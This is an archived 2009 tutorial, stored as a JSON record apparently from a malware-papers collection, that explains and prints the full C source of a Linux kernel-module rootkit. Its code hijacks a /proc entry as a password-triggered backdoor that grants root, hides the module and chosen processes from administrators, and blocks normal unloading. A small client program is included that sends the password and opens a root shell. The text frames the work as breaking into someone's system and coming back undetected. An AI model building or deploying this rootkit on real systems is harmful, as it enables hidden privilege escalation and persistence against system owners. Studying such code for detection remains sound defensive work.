{
    "id": "7f688bc4-1c5a-4f7d-bf0e-d56d45dd7f62",
    "created_at": "2023-03-03T02:06:08.510951Z",
    "updated_at": "2025-03-27T02:06:04.066344Z",
    "deleted_at": null,
    "sha1_hash": "4b00565b560ccaec1033c88c42d22c3ab8a133cc",
    "title": "2009-07-25 - Writing a Simple Rootkit for Linux",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 58708,
    "plain_text": "```\nWRITING A SIMPLE ROOTKIT FOR LINUX\nAuthor: Ormi <ormi.ormi@gmail.com>\nWebsite: http://black-coders.net\nIn this article, I'll describe how to write a simple rootkit for linux.\nHowever, to understand this article, you must know how to write\nlinux kernel modules. If you don't know, you can read my article:\nhttp://black-coders.net/articles/linux/linux-kernel-modules.php\nWhat is a rootkit? When you break into sb's system you will probably want to\nbe able to \"come back\" there after some time. When you install\na rootkit in that system you will be able to get administrator privileges\nwhenever you want. Good rootkits can hide in compromised system,\nso that they can't be found by administrator. There are many ways to hide in\na system. I'm not going to describe all of them :)\nIn this article we are talking only about linux rootkits.\nThere are some main types of rootkits for linux.\nFor example there are rootkits that replace some most important programs in\nsystem(ls, ps, netstat etc.) with modified versions of them that\nwon't let administrator see that something's wrong. Although, such a rootkit\nis quite easy to detect.\nOther rootkits work as linux kernel modules. They work in kernel mode, so\nthey can do everything they want. They can hide themselves, files,\nprocesses etc. In this tutorial we are talking about this type of rootkits.\nRootkit described in this article is meant to work on \"vanilla\" kernels >=\n2.6.29 On older kernels it doesn't compile properly. However,\nafter a small modification it can work. But I don't guarantee anything ;)\nPlease, notice that it is not \"true\" rootkit. To use its features like\ngetting root privileges you must have local acces to system with\ninstalled rootkit. It can be \"normal\" user account, but you must be able to\nlog to that account. For addition when system with installed rootkit\nreboots, our rootkit will be \"uninstalled\" because it is not loaded at the\nboot time. But this article is not meant to give script kiddies\ntrue rootkit which they will be able to use. This article only has to teach\nyou basics of programming rootkits.\nAt first, I will describe generally how this rootkit works, then I will show\nits code and finally I will write in details how it works.\nSo, let's go:\n1. I will start with describing what features it will have.\na) When users \"sends\" correct command to the rootkit, he will get root\nprivileges.\nb) Another command will let user to hide a process\n\n```\n\n-----\n\n```\nc) To make possible to unload rootkit safely(without any Oops or errors) it\nwill have functions which will make rootkit visible etc.\nI will describe them soon.\nd) Another function will let user to \"unhide\" lastly hidden process.\n2. Let's see what functions will be called during loading the rootkit:\na) module_remember_info() - this functions saves some information about\nrootkit to make possible to unload it later.\nb) proc_init() - this is very important function which make possible to\n\"send\" command to rootkit.\nc) module_hide() - in this function we hide the rootkit\nd) tidy() - in this function we do some clean up. If we don't do this, there\nwill be some errors during unloading the rootkit.\ne) rootkit_protect() - this is very simple function which just makes\nimpossible to unload the rootkit by \"rmmod rootkit\" command\neven if it is visible. However it is still possible to unload by \"rmmod -f\nrootkit\" if kernel wa was compiled with support\nfor forced unloading modules.\n3. Now, I will describe those functions in details:\n- proc_init():\nAs already mentioned, this function makes possible to send command to the\nrootkit. Firstly, I wanted to create an entry in proc\nand then hide it so that it's not possible to find it by \"readdir\" syscall.\nBut it's not good idea. It was still possible to find rootkit\nfrom kernel mode by browsing list of entries in proc. So, what did I do? The\nrootkit finds an existing entry(for example /proc/version)\nand replaces its existing functions(like read_proc and write_proc) with other\nfunctions. Commands are sent to rootkit by writing or reading\nfrom \"infected\" entry. You can ask: \"So by reading or writing? Or both?\". It\ndepends on what functions had infected entry.\nIf it had only writing function, we replace it. Why not to create function\nfor reading? Because it would be suspicious if entry\nsuddenly gets funtion for writing. We have to avoid it - administrator cannot\ndetect us! If entry had only reading function, we replace it.\nIf it had both, reading and writing functions, we replace only writing\nfunction.\nSo, how to pass commands to that entry? When writing function was replaced\nyou have to just write to that entry correct command. You can do this\nusing echo or similar programs. However, if you want to get root privileges,\nyou must write your own program which writes to that entry and then\nusing execve syscall runs shell.\nIf reading function was replaced, you must write special program. What does\nit have to do? It must read from that entry using read syscall.\nOne of parameters of this function is pointer to buffer where data has to be\nwritten. To pass command to our entry, you must save that command\nin a buffer. Then, you give pointer to that buffer as parameter of read\nsyscall.\nLater I will show code of example program which can be used for passing\ncommand to the rootkit.\n\n```\n\n-----\n\n```\nLet's move to next function.\n- rootkit_hide():\nIn this function we hide the rootkit. First problem is that rootkit is\ndisplayed by \"lsmod\" command and is visible in /proc/modules file.\nTo solve this problem we can delete our module from main list of modules.\nEach module is represented by module structure.\nLet's take a look at a definition of this structure:\n---------------------------struct module\n{\nenum module_state state;\n/* Member of list of modules */\nstruct list_head list;\n/* Unique handle for this module */\nchar name[MODULE_NAME_LEN];\n/* Sysfs stuff. */\nstruct module_kobject mkobj;\nstruct module_attribute *modinfo_attrs;\nconst char *version;\nconst char *srcversion;\nstruct kobject *holders_dir;\n/* Exported symbols */\nconst struct kernel_symbol *syms;\nconst unsigned long *crcs;\nunsigned int num_syms;\n/* Kernel parameters. */\nstruct kernel_param *kp;\nunsigned int num_kp;\n/* GPL-only exported symbols. */\nunsigned int num_gpl_syms;\nconst struct kernel_symbol *gpl_syms;\nconst unsigned long *gpl_crcs;\n#ifdef CONFIG_UNUSED_SYMBOLS\n/* unused exported symbols. */\nconst struct kernel_symbol *unused_syms;\nconst unsigned long *unused_crcs;\nunsigned int num_unused_syms;\n/* GPL-only, unused exported symbols. */\nunsigned int num_unused_gpl_syms;\n\n```\n\n-----\n\n```\nconst struct kernel_symbol *unused_gpl_syms;\nconst unsigned long *unused_gpl_crcs;\n#endif\n/* symbols that will be GPL-only in the near future. */\nconst struct kernel_symbol *gpl_future_syms;\nconst unsigned long *gpl_future_crcs;\nunsigned int num_gpl_future_syms;\n/* Exception table */\nunsigned int num_exentries;\nstruct exception_table_entry *extable;\n/* Startup function. */\nint (*init)(void);\n/* If this is non-NULL, vfree after init() returns */\nvoid *module_init;\n/* Here is the actual code + data, vfree'd on unload. */\nvoid *module_core;\n/* Here are the sizes of the init and core sections */\nunsigned int init_size, core_size;\n/* The size of the executable code in each section. */\nunsigned int init_text_size, core_text_size;\n/* Arch-specific module values */\nstruct mod_arch_specific arch;\nunsigned int taints; /* same bits as kernel:tainted */\n#ifdef CONFIG_GENERIC_BUG\n/* Support for BUG */\nunsigned num_bugs;\nstruct list_head bug_list;\nstruct bug_entry *bug_table;\n#endif\n#ifdef CONFIG_KALLSYMS\n/* We keep the symbol and string tables for kallsyms. */\nElf_Sym *symtab;\nunsigned int num_symtab;\nchar *strtab;\n/* Section attributes */\nstruct module_sect_attrs *sect_attrs;\n\n```\n\n-----\n\n```\n/* Notes attributes */\nstruct module_notes_attrs *notes_attrs;\n#endif\n/* Per-cpu data. */\nvoid *percpu;\n/* The command line arguments (may be mangled). People like\nkeeping pointers to this stuff */\nchar *args;\n#ifdef CONFIG_MARKERS\nstruct marker *markers;\nunsigned int num_markers;\n#endif\n#ifdef CONFIG_TRACEPOINTS\nstruct tracepoint *tracepoints;\nunsigned int num_tracepoints;\n#endif\n#ifdef CONFIG_TRACING\nconst char **trace_bprintk_fmt_start;\nunsigned int num_trace_bprintk_fmt;\n#endif\n#ifdef CONFIG_MODULE_UNLOAD\n/* What modules depend on me? */\nstruct list_head modules_which_use_me;\n/* Who is waiting for us to be unloaded */\nstruct task_struct *waiter;\n/* Destruction function. */\nvoid (*exit)(void);\n#ifdef CONFIG_SMP\nchar *refptr;\n#else\nlocal_t ref;\n#endif\n#endif\n};\n--------------------------struct list_head list - this is the main list of modules. We have to delete\nour module from this list.\n\n```\n\n-----\n\n```\nWhen we do this, rootkit will no longer be visible by \"lsmod\" and in \"/proc/\nmodules\".\nBut our rootkit is still visible in /sys/module/ directory. /sys is also\nspecial filesystem(like /proc).\nEach entry in /sys is represented by kobject structure. Each module has its\nown kobject. In definition of struct module we see:\nstruct module_kobject mkobj\nLet's look at definition of module_kobject structure:\n-----------------struct module_kobject\n{\nstruct kobject kobj;\nstruct module *mod;\nstruct kobject *drivers_dir;\nstruct module_param_attrs *mp;\n};\n-------------------Most important for us is\nstruct kobject kobj\nkobj represents our module in /sys/module/ directory.\nLet's look at definition os kobject structure.\n-------------------struct kobject {\nconst char *name;\nstruct list_head entry;\nstruct kobject *parent;\nstruct kset *kset;\nstruct kobj_type *ktype;\nstruct sysfs_dirent *sd;\nstruct kref kref;\nunsigned int state_initialized:1;\nunsigned int state_in_sysfs:1;\nunsigned int state_add_uevent_sent:1;\nunsigned int state_remove_uevent_sent:1;\nunsigned int uevent_suppress:1;\n};\n-----------------We see:\nstruct list_head entry;\nThis is list of kobjects. At first, we must delete our module from /sys/\nmodules by kobject_del() function and then\nwe must delete our kobject from \"entry\" list. Let's talk about next function\n\n```\n\n-----\n\n```\n- tidy():\nWhen you analyse what kernel does during unloading a module you will see that\nit deletes entry in /sys/module for that module.\nBut there's a problem - we removed that entry. So when we unload a module the\nkernel will try to remove non-existing entry. This will cause\nOops and probably the system will crash. We must avoid it. But you can see\nthat when we set some pointers to NULL, the kernel won't try\nto remove that entry. If you want to really understand this function you must\nbrowse linux kernel's source code on your own. Writing\nabout process of loading and unloading modules could be bigger than 7\narticles like this you are currently reading ;)\n-rootkit_protect():\nVery simple function. It just calls try_module_get function, giving pointer\nto current module as parameter.\ntry_module_get increases counter of references to the module. As a result,\nmodule cannot be unloaded by normal \"rmmod\" command.\nHowever, as already mentioned, if kernel was compiled with support for forced\nmodules unloading, module still can be unloaded\nby \"rmmod -f\" command.\nThere is also an important function module_show() which is invoked when user\n\"tells\" the rootkit to \"unhide\" module. It just adds the rootkit\nto main list of modules in place where it was previously.\nmodule_remember_info which I haven't decribed yet just saves pointer to entry\nin that\nlist which was \"before\" our rootkit. module_show() adds rootkit to that list\n\"after\" that entry.\n4. There are some other functions I have to explain.\nbuf_read and buf_write - these are functions which will \"put\" instead of\noriginal writing/reading funtions. They execute check_buf function\nwhich checks if there is a command passed. If there is command passed, there\nis done correct thing. If not, original function is invoked.\ncheck_buf - As mentioned, this function checks commands. I'll explain details\nsoon.\nThere is one thing I have to explain.\nTo list running processes from user mode, programs list content of /proc.\nEach process has its own directory there. Name of that directory\nis this process' PID. Notice that proc_dir_entry has pointer to\nfile_operations structure.\nThis structure defines operations on a file. In this situation on entry in\n/proc. Let's look at definition of this structure:\n--------------------\n```\n\n-----\n\n```\nstruct file_operations {\nstruct module *owner;\nloff_t (*llseek) (struct file *, loff_t, int);\nssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\nssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\nssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long,\nloff_t);\nssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long,\nloff_t);\nint (*readdir) (struct file *, void *, filldir_t);\nunsigned int (*poll) (struct file *, struct poll_table_struct *);\nint (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);\nlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\nlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\nint (*mmap) (struct file *, struct vm_area_struct *);\nint (*open) (struct inode *, struct file *);\nint (*flush) (struct file *, fl_owner_t id);\nint (*release) (struct inode *, struct file *);\nint (*fsync) (struct file *, struct dentry *, int datasync);\nint (*aio_fsync) (struct kiocb *, int datasync);\nint (*fasync) (int, struct file *, int);\nint (*lock) (struct file *, int, struct file_lock *);\nssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *,\nint);\nunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned\nlong, unsigned long, unsigned long);\nint (*check_flags)(int);\nint (*flock) (struct file *, int, struct file_lock *);\nssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *,\nsize_t, unsigned int);\nssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *,\nsize_t, unsigned int);\nint (*setlease)(struct file *, long, struct file_lock **);\n};\n---------------------Important fields for us are: read, write and readdir.\nreaddir - this function is used to list content of a directory. How do we\nhide a process? We store pid's of hidden processes in \"pid\" buffer.\nWe find proc_dir_entry for /proc. Then we replace its readdir function in\nfile_operations with our own. This function normally lists content of\n/proc, but omits directories representing hidden processes. How does readdir\nfuction work?\nIt just goes through elements in a directory, but there is one interesting\nthing. It doesn't write data connected with directory's content anywhere\ndirectly but uses filldir function(given as a parameter) to do this.\n\n```\n\n-----\n\n```\nfilldir_t filldir - this is pointer to filldir function which has to be used\nby readdir function. Let's look at the prototype:\n--------------------------------------static int filldir(void * __buf, const char * name, int namlen, loff_t\noffset,\nu64 ino, unsigned int d_type)\n--------------------------------------For example:\nreaddir function for /proc directory lists its content. It goes through all\nelements. For each element it invokes filldir as \"name\" parameter\ngiving name of current element.\nSo: If programs list content of /proc to see what processes run in the system\nand readdir function from file_operations structure is used\nto list content of a directory, we can modify readdir of /proc so that it\nwon't display processes we want to hide! We just set \"readdir\" pointer\nin /proc's file_operations structure to our version of readdir. Our readdir\njust invokes original readdir but as its \"filldir\" parameter gives\npointer to our filldir function. What does our filldir do? It checks if\n\"name\" parameter is equal to pid of one of hidden processes.\nIf it is, it just doesn't display it. Otherwise, it invokes original filldir\nfunction.\nAnother thing I have to explain is connected with replacing reading and\nwriting functions. There are two possiblities to \"define\" reading\nand writing functions for entry in /proc. You can give pointer to your\nfunction in proc_read/proc_write field or give pointer to your function\nin entry's file_operations structure's read/write fields. When we infect\nentry we set proc_read/proc_write pointer to our function, if\nit was originally set and we set read/write field of file_operations if it\nwas set.\nHow to change user's privileges to root privileges? We must change uid, euid,\ngid and egid of current process to 0. Each process\nis represented by task_struct structure. It's quite complex structure and I\nwon't show its definition here. uid, gid and other\nsimilar \"things\" are stored in cred structure which is element of\ntask_struct. To change value of this fields we have to invoke\nprepare_creds() function which returns pointer to struct cred with uid, gid\netc. set to values equal to values of uid, gid etc. in\ncurrent process' cred structure. Then, we can modify all fields of this\nstructure. Finally we invoke commit_creds() function, giving pointer\nto our struct cred as parameter.\n\n```\n\n-----\n\n```\nHow do we find entry which has to be infected? Entries in /proc are organised\nin form of a list - proc_dir_entry has field \"next\" which\nis pointer to next entry in current directory. Each directory in /proc has\n\"subdir\" field, which is pointer to first entry in that directory.\nSo how do we locate entry we want to infect? At first we set pointer to /proc\ndirectory. Let's name this pointer \"ptr\".\nThen we set it to ptr->subdir. After that we compare name of entry which is\npointed by ptr with name of entry we want to infect. If it is equal,\nwe found our entry. Otherwise we go to ptr->next and compare its name with\nentry to infect etc.\nAll commands and other important things are configured in rootkit_conf.conf.h\nconfiguration file.\n5. It's time to show code of our rootkit. If I haven't explained something\nyet, I will describe it as comments in the code.\nAt first, rootkit_conf.conf.h:\n-------------------------------/* Config file! */\nstatic char password[] = \"secretpassword\" ; //give here password\nstatic char passwaiter[] = \"version\" ; //here is name of entry to infect in\n/proc - you pass commands to it\nstatic char module_release[] = \"release\" ; //command to release the\nmodule(make possible to unload it)\nstatic char module_uncover[] = \"uncover\" ; //command to show the module\nstatic char hide_proc[] = \"hide\" ; //command to hide specified process\nstatic char unhide_proc[] = \"unhide\"; //command to \"unhide\" last hidden\nprocess\n----------------------And rootkit.c:\n------------------------------#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/proc_fs.h>\n#include <linux/sched.h>\n#include <linux/string.h>\n#include <linux/cred.h>\n#include <linux/stat.h>\n#include <linux/uaccess.h>\n#include <linux/file.h>\n\n```\n\n-----\n\n```\n#include \"rootkit_conf.conf.h\"\nMODULE_LICENSE(\"GPL\") ;\nMODULE_AUTHOR(\"Ormi<ormi.ormi@gmail.com>\") ;\nMODULE_DESCRIPTION(\"Simple rootkit using procfs\") ;\nMODULE_VERSION(\"0.1.2\");\nstatic int failed;\nstatic char pid[10][32];\nstatic int pid_index;\n/* Here are pointers in which we save original, replaced pointers. We use\nthem later, during unloading the module.\nI think that their names explain what they are ;) */\nstatic int (*old_proc_readdir)(struct file *, void *, filldir_t);\nstatic filldir_t old_filldir ;\nstatic ssize_t (*old_fops_write) (struct file *, const char __user *,\nsize_t, loff_t *);\nstatic ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t\n*);\nstatic write_proc_t *old_write;\nstatic read_proc_t *old_read;\nstatic struct proc_dir_entry *ptr; /* Pointer to \"infected\" entry */\nstatic struct proc_dir_entry *root; /* Pointer to /proc directory */\nstatic struct list_head *prev; /* Pointer to entry in main modules list which\nwas before our module before we hid the rootkit */\nstatic struct file_operations *fops; /* file_operations of infected entry */\nstatic struct file_operations *root_fops; /* file_operations of /proc\ndirectory */\nstatic inline void module_remember_info(void)\n{\nprev = THIS_MODULE->list.prev;\n}\nstatic inline void module_show(void)\n{\nlist_add(&THIS_MODULE->list, prev); /* We add our module to main list of\nmodules */\n}\n/* Parameter of this function is pointer to buffer in which there should be\ncommand */\nstatic int check_buf(const char __user *buf)\n{\n/* Here we give root privileges */\n\n```\n\n-----\n\n```\nstruct cred *new = prepare_creds();\nif (!strcmp(buf, password)) {\nnew->uid = new->euid = 0;\nnew->gid = new->egid = 0;\ncommit_creds(new);\n}\n/* Here we make possible to unload the module by \"rmmod\" */\nelse if (!strcmp(buf, module_release))\nmodule_put(THIS_MODULE);\n/* Here we make module visible */\nelse if (!strcmp(buf, module_uncover))\nmodule_show();\n/* We hide process */\nelse if (!strncmp(buf, hide_proc, strlen(hide_proc))) {\nif (pid_index > 9)\nreturn 0;\nsprintf(pid[pid_index], \"%s\", buf + 5);\npid_index++;\n}\n/* We \"unhide\" lastly hidden process */\nelse if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) {\nif (!pid_index)\nreturn 0;\npid_index--;\n}\n/* If we are here, there was no command passed */\nelse\nreturn 1;\nreturn 0;\n}\n/* Our \"write\" function */\nstatic int buf_write(struct file *file, const char __user *buf,\nunsigned long count, void *data)\n{\n/* If check_buf return 0, there was command passed */\nif (!check_buf(buf))\nreturn count;\n/* Otherwise we execute original function */\nreturn old_write(file, buf, count, data);\n}\n/* Our \"read\" function for read_proc field*/\nstatic int buf_read(char __user *buf, char **start, off_t off,\nint count, int *eof, void *data)\n{\nif (!check_buf(buf))\n\n```\n\n-----\n\n```\nreturn count;\nreturn old_read(buf, start, off, count, eof, data);\n}\n/* For file_operations structure */\nstatic ssize_t fops_write(struct file *file, const char __user *buf_user,\nsize_t count, loff_t *p)\n{\nif (!check_buf(buf_user))\nreturn count;\nreturn old_fops_write(file, buf_user, count, p);\n}\n/* For file_operations structure */\nstatic ssize_t fops_read(struct file *file, char __user *buf_user,\nsize_t count, loff_t *p)\n{\nif (!check_buf(buf_user))\nreturn count;\nreturn old_fops_read(file, buf_user, count, p);\n}\n/* Our filldir function */\nstatic int new_filldir(void *__buf, const char *name, int namelen,\nloff_t offset, u64 ino, unsigned d_type)\n{\nint i;\n/* We check if \"name\" is pid of one of hidden processes */\nfor (i = 0; i < pid_index; i++)\nif (!strcmp(name, pid[i]))\nreturn 0; /* If yes, we don't display it */\n/* Otherwise we invoke original filldir */\nreturn old_filldir(__buf, name, namelen, offset, ino, d_type);\n}\n/* Our readdir function */\nstatic int new_proc_readdir(struct file *filp, void *dirent, filldir_t\nfilldir)\n{\n/* To invoke original filldir in new_filldir we have to remeber pointer to\noriginal filldir */\nold_filldir = filldir;\n/* We invoke original readdir, but as \"filldir\" parameter we give pointer to\nour filldir */\nreturn old_proc_readdir(filp, dirent, new_filldir) ;\n}\n/* Here we replace readdir function of /proc */\n\n```\n\n-----\n\n```\nstatic inline void change_proc_root_readdir(void)\n{\nroot_fops = (struct file_operations *)root->proc_fops;\nold_proc_readdir = root_fops->readdir;\nroot_fops->readdir = new_proc_readdir;\n}\nstatic inline void proc_init(void)\n{\nptr = create_proc_entry(\"temporary\", 0444, NULL);\nptr = ptr->parent;\n/* ptr->parent was pointer to /proc directory */\n/* If it wasn't, something is seriously wrong */\nif (strcmp(ptr->name, \"/proc\") != 0) {\nfailed = 1;\nreturn;\n}\nroot = ptr;\nremove_proc_entry(\"temporary\", NULL);\nchange_proc_root_readdir(); /* We change /proc's readdir function */\nptr = ptr->subdir;\n/* Now we are searching entry we want to infect */\nwhile (ptr) {\nif (strcmp(ptr->name, passwaiter) == 0)\ngoto found; /* Ok, we found it */\nptr = ptr->next; /* Otherwise we go to next entry */\n}\n/* If we didn't find it, something is wrong :( */\nfailed = 1;\nreturn;\nfound:\n/* Let's begin infecting */\n/* We save pointers to original reading and writing functions, to restore\nthem during unloading the rootkit */\nold_write = ptr->write_proc;\nold_read = ptr->read_proc;\nfops = (struct file_operations *)ptr->proc_fops; /* Pointer to\nfile_operations structure of infected entry */\nold_fops_read = fops->read;\nold_fops_write = fops->write;\n/* We replace write_proc/read_proc */\nif (ptr->write_proc)\nptr->write_proc = buf_write;\nelse if (ptr->read_proc)\nptr->read_proc = buf_read;\n\n```\n\n-----\n\n```\n/* We replace read/write from file_operations */\nif (fops->write)\nfops->write = fops_write;\nelse if (fops->read)\nfops->read = fops_read;\n/* There aren't any reading/writing functions? Error! */\nif (!ptr->read_proc && !ptr->write_proc &&\n!fops->read && !fops->write) {\nfailed = 1;\nreturn;\n}\n}\n/* This functions does some \"cleanups\". If we don't set some pointers tu\nNULL,\nwe can cause Oops during unloading rootkit. We free some structures,\nbecause we don't want to waste memory... */\nstatic inline void tidy(void)\n{\nkfree(THIS_MODULE->notes_attrs);\nTHIS_MODULE->notes_attrs = NULL;\nkfree(THIS_MODULE->sect_attrs);\nTHIS_MODULE->sect_attrs = NULL;\nkfree(THIS_MODULE->mkobj.mp);\nTHIS_MODULE->mkobj.mp = NULL;\nTHIS_MODULE->modinfo_attrs->attr.name = NULL;\nkfree(THIS_MODULE->mkobj.drivers_dir);\nTHIS_MODULE->mkobj.drivers_dir = NULL;\n}\n/*\nWe must delete some structures from lists to make rootkit harder to detect.\n*/\nstatic inline void rootkit_hide(void)\n{\nlist_del(&THIS_MODULE->list);\nkobject_del(&THIS_MODULE->mkobj.kobj);\nlist_del(&THIS_MODULE->mkobj.kobj.entry);\n}\nstatic inline void rootkit_protect(void)\n{\ntry_module_get(THIS_MODULE);\n}\nstatic int __init rootkit_init(void)\n{\n\n```\n\n-----\n\n```\nmodule_remember_info();\nproc_init();\nif (failed)\nreturn 0;\nrootkit_hide();\ntidy();\nrootkit_protect();\nreturn 0 ;\n}\nstatic void __exit rootkit_exit(void)\n{\n/* If failed, we don't have to do any cleanups */\nif (failed)\nreturn;\nroot_fops->readdir = old_proc_readdir;\nfops->write = old_fops_write;\nfops->read = old_fops_read;\nptr->write_proc = old_write;\nptr->read_proc = old_read;\n}\nmodule_init(rootkit_init);\nmodule_exit(rootkit_exit);\n-------------------------------Take a look at example program which sends commands to our entry:\n-----------------#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/stat.h>\n#include \"rootkit_conf.conf.h\"\nchar file[64];\nchar command[64];\nint root = 0;\nint main(int argc, char *argv[]) {\nif(argc < 2) {\n\n```\n\n-----\n\n```\nfprintf(stderr, \"Usage: %s <command>\\n\", argv[0]);\nreturn 1;\n}\nint fd ;\n/* We get path to infected entry */\nsprintf(file, \"/proc/%s\", passwaiter);\n/* If sent command is equal to command which has to give us root, we must run\nshell at the end */\nif(!strcmp(argv[1], password))\nroot = 1;\n/* At first we try to write command to that entry */\nfd = open(file, O_WRONLY) ;\nif(fd < 1) {\nprintf(\"Opening for writing failed! Trying to open for reading!\\n\");\n/* Otherwise, we send command by reading */\nfd = open(file, O_RDONLY);\nif(!fd) {\nperror(\"open\");\nreturn 1;\n}\nread(fd, argv[1], strlen(argv[1]));\n}\nelse\nwrite(fd, argv[1], strlen(argv[1]));\nend:\nclose(fd) ;\nprintf(\"[+] I did it!\\n\") ;\n/* if we have to get root, we run shell */\nif(root) {\nuid_t uid = getuid() ;\nprintf(\"[+] Success! uid=%i\\n\", uid) ;\nsetuid(0) ;\nsetgid(0) ;\nexecl(\"/bin/bash\", \"bash\", 0) ;\n}\nreturn 0;\n}\n---------------How to compile this rootkit? You should know this if you read my previous\narticles about programming linux kernel modules ;)\nYou can ask \"why everything in rootkit is defined as \"static\"\"? Because\nthings defined as static aren't exported to /proc/kallsyms.\nIt makes the rootkit harder to detect. I won't desribe details - /proc/\nkallsyms is good topic for another article :)\n\n```\n\n-----\n\n```\nThat's all for now ;) Good bye :)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Kernel Mode/2009-07-25 - Writing a Simple Rootkit for Linux.pdf"
    ],
    "report_names": [
        "2009-07-25 - Writing a Simple Rootkit for Linux.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1677809168,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/4b00565b560ccaec1033c88c42d22c3ab8a133cc.pdf",
        "text": "https://archive.orkl.eu/4b00565b560ccaec1033c88c42d22c3ab8a133cc.txt",
        "img": "https://archive.orkl.eu/4b00565b560ccaec1033c88c42d22c3ab8a133cc.jpg"
    }
}